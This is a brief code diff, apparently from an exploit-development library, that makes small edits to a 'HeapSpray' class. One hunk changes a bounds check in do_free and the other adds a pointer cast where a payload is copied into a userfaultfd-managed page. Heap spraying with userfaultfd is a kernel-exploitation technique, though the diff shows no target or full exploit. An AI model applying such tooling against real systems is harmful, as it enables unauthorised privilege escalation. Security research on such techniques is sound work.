@@ -178,7 +178,7 @@ void HeapSpray::do_spray(int round, int shade) {
 }
 
 void HeapSpray::do_free(u_int64_t val) {
-    if (val < 512) {
+    if (val < MAX_ROUND) {
         u_int64_t id = val;
         pthread_mutex_lock(order_lock);
         pthread_mutex_unlock(lock[id]);
@@ -283,7 +283,7 @@ int HeapSpray::init_userfaultfd(void *addr, char *payload, int size) {
         errExit("ioctl-UFFDIO_API");
     
 
-    memcpy(addr + page_size - payloadSize, payload, size);
+    memcpy((void *)((unsigned long)addr + page_size - payloadSize), payload, size);
 
     void *n_addr = (void *)((unsigned long) addr + page_size);
 
